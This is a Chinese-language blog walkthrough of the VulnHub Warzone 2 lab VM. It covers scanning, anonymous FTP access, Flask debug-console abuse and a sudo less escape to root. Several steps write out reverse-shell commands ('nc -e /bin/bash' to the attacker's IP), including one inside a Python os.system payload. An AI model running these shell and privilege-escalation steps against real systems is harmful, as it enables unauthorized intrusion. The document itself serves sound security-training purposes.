-<h4><span id="文件名warzone2ova">文件名：Warzone2.ova</span></h4><h4><span id="文件大小26gb">文件大小：2.6GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomwarzonewarzone2ova">下载地址：</span></h4><h4><span id="md5-ff639b25fb64a049e094fc20f51b732c">MD5: FF639B25FB64A049E094FC20F51B732C</span></h4><h4><span id="sha1-e5b5cadf476129cc365edf58c5855497b97f1aa5">SHA1: E5B5CADF476129CC365EDF58C5855497B97F1AA5</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机warzone2和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2023/12/11/Warzone-2/1.png" alt="image"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/2.png" alt="image"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/3.png" alt="image"></p>
-<p>2.再进行端口扫描，发现开放了21，22和1337端口，都是无法网页访问的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.129 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/4.png" alt="image"></p>
-</blockquote>
-<h3><span id="ftp匿名登录">FTP匿名登录</span></h3><blockquote>
-<p>1.来到21端口，我们发现ftp服务可匿名登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.129</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/5.png" alt="image"></p>
-<p>2.在&#x2F;anon目录下我们能发现username.PNG，password.PNG及token.PNG，全部获取到kali查看一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd anon</span><br><span class="line">ls -la</span><br><span class="line">get username.PNG</span><br><span class="line">get password.PNG</span><br><span class="line">get token.PNG</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/6.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-2/7.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-2/8.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-2/9.png" alt="image"></p>
-<p>3.在网络上查询旗语的指代，可以得到用户名为semaphore，密码为signalperson，然后进行sha256加密再转hex后得到token为833ad488464de1a27d512f104b639258e77901f14eab706163063d34054a7b26，可以远程链接1337端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.56.129 1337</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/10.png" alt="image"></p>
-<p>4.可以在kali开启对应的端口监听，获取shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.56.102 1234，靶机返回shell</span><br><span class="line"></span><br><span class="line">nc -lvnp 1234，kali开启监听</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/11.png" alt="image"></p>
-</blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.在&#x2F;flagman目录下我们能发现一个warzone2-socket-server目录，在其中的.mysshpassword文件可以发现flagman的ssh登录密码，可以登录到flagman：</p>
-<p><img src="/2023/12/11/Warzone-2/12.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-2/13.png" alt="image"></p>
-<p>2.在flagman用户下利用sudo -l命令能发现admiral用户能够执行wrz2-app.py，而flagman无权读写该文件：</p>
-<p><img src="/2023/12/11/Warzone-2/14.png" alt="image"></p>
-<p>3.运行wrz2-app.py发现程序在5000端口起了一个flask，并且开启了debug和输出了pin码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u admiral /usr/bin/python3 /home/admiral/warzone2-app/wrz2-app.py</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/15.png" alt="image"></p>
-<p>4.那么我们就要尝试在debug中获取反弹shell，获取用户admiral权限。由于监听在地址127.0.0.1，这里使用socat做了一个端口转发：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:15000,reuseaddr,fork TCP4:127.0.0.1:5000</span><br><span class="line"></span><br><span class="line">sudo -u admiral /usr/bin/python3 /home/admiral/warzone2-app/wrz2-app.py，再开启一个窗口链接flagman执行wrz2-app.py</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/16.png" alt="image"></p>
-<p>5.访问192.168.56.129:15000&#x2F;console，输入wrz2-app.py生成的PIN，构造shell，在kali开启对应端口监听，成功反弹：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;nc -e /bin/bash 192.168.56.102 9002&#x27;</span>)</span><br><span class="line"></span><br><span class="line">nc -lvnp <span class="number">9002</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/17.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-2/18.png" alt="image"></p>
-<p>6.在&#x2F;home&#x2F;admiral&#x2F;Desktop目录下，我们能获得第一个flag，silver.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/Desktop</span><br><span class="line">ls -la</span><br><span class="line">cat silver.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/19.png" alt="image"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.再通过sudo -l命令，可以看到less可以执行特权命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/20.png" alt="image"></p>
-<p>2.那我们可以直接使用less进行提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/less /var/public/warzone-rules.txt</span><br><span class="line">:!id，在warzone-rules.txt编辑页输入</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/21.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-2/22.png" alt="image"></p>
-<p>3.成功提权到root，并可以在&#x2F;root&#x2F;Desktop下发现第二个flag，gold.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/less /var/public/warzone-rules.txt</span><br><span class="line">cat /root/Desktop/gold.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-2/23.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/Warzone/" rel="tag">Warzone</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
             </div>
         
 
